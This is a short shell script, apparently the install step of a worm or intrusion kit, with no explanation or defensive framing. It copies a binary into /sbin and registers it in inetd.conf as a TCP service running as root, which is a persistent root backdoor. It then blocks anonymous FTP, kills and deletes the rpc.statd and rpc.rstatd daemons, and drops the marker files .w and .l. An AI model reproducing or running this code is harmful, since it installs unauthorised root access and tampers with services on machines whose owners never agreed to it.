#!/bin/sh

cp asp62 /sbin/asp
echo asp stream tcp nowait root /sbin/asp >> /etc/inetd.conf
killall -HUP inetd

echo "ftp" >> /etc/ftpusers
echo "anonymous" >> /etc/ftpusers
killall -9 rpc.statd
killall -9 rpc.rstatd
rm  -f /sbin/rpc.statd
rm -f /usr/sbin/rpc.rstatd
touch .w
touch .l

